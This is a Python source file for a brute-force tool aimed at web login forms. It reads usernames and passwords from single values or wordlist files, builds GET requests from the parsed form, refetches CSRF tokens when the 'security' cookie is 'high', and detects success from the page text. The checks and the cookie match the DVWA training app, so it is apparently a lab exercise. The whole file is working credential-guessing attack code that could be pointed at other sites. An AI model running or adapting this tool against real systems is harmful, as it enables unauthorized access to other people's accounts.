import requests
import os
import sys
from bs4 import BeautifulSoup

class Brute(object):
  count = 0

  def __init__(self,url,cookies):

    self.url = url
    self.cookies = cookies

  def force(self):
    self.orgin = requests.get(self.url,cookies=self.cookies)
    self.user = input("\033[1;31minput a single username or username file path:\033[0m")
    self.password = input("\033[1;31minput a single password or password file path:\033[0m")

    user_exists = os.path.isfile(self.user)
    pass_exists = os.path.isfile(self.password)

    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")

    method = soup.form['method']
    form = soup.form("input")

    if method.lower() == 'get':
      self.url = self.url+"?"
      for each in form:
        if each['type'].lower() == 'text':
          self.url = self.url + each['name'] + "=" + self.user + "&"
        elif each['type'].lower() == 'password':
          self.url = self.url + each['name'] + "=" +self.password + "&"
        elif each['type'].lower() == 'submit':
          self.url = self.url + each['name'] + "=" + each['value']

    if user_exists and pass_exists:
      self.both()

    elif user_exists and not pass_exists:
      self.single_password()

    elif pass_exists and not user_exists:
      self.single_username()

    elif not user_exists and not pass_exists:
      self.single()

    else:
      print("wrong input,quit...")
      sys.exit()

  def Token(self):
    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    token = soup.form("input")[3]['name']
    value = soup.form("input")[3]['value']
    return "&"+token+"="+value

  def single_username(self):

    url = self.url.split("&")

    with open(self.password,'r') as pass_f:
      for pas in pass_f:
        force = url[0]+"&"+url[1].split("=")[0]+"="+pas.split("\n")[0]+"&"+url[2]
        if self.cookies['security'] == 'high':
          rep = requests.get(force+self.Token(),cookies=self.cookies)
        else:
          rep = requests.get(force,cookies=self.cookies)
        print("Check %s:%s" % (self.user,pas.split("\n")[0]))
        if self.check(rep.text,self.user):
          print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (self.user,pas.split("\n")[0]))
          pass_f.close()
          sys.exit()



  def single_password(self):
    url = self.url.split("&")
    with open(self.user,'r') as user_f:
      for name in user_f:
        force = url[0].split("=")[0] +"="+name.split("\n")[0] + "&" + url[1] + \
            "&" + url[2]
        if self.cookies['security'] == 'high':
          rep = requests.get(force+self.Token(),cookies=self.cookies)
        else:
          rep = requests.get(force,cookies=self.cookies)
        if self.check(rep.text,'',self.password):
          print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (name.split("\n")[0],self.password))
          user_f.close()
          sys.exit()




  def both(self):
    url = self.url.split("&")

    with open(self.user,'r') as user_f:
      with open(self.password,'r') as pass_f:
        for name in user_f:
          for pas in pass_f:
            Name = name.split("\n")[0]
            Pass = pas.split("\n")[0]
            N = url[0].split("=")[0]+"="+Name
            P = url[1].split("=")[0]+"="+Pass
            force  = N.strip()+"&"+P.strip()+"&"+url[2]
            if self.cookies['security'] == 'high':
              rep = requests.get(force+self.Token(),cookies=self.cookies)
            else:
              rep = requests.get(force,cookies=self.cookies)
            print("Check %s:%s" % (Name,Pass))

            if self.check(rep.text,Name,Pass):
              print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (Name,Pass))
              pass_f.close()
              user_f.close()
              sys.exit()

          pass_f.seek(0)


  def single(self):
    if self.cookies['security'] == 'high':
      rep = requests.get(self.url+self.Token(),cookies=self.cookies)
    else:
      #rep = requests.get(force,cookies=self.cookies)
      rep = requests.get(self.url,cookies=self.cookies)
    self.check(rep.text)


  def check(self,text,N='',P=''):
    if "Username and/or password incorrect." not in text and "CSRF token is incorrect" not in text and "Welcome" in text:
      if N != '' and P != '':
        return True
      elif N != '':
        print(text)
        return True
      elif P != '':
        print(text)
        return True
      print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (self.user,self.password))
      sys.exit()

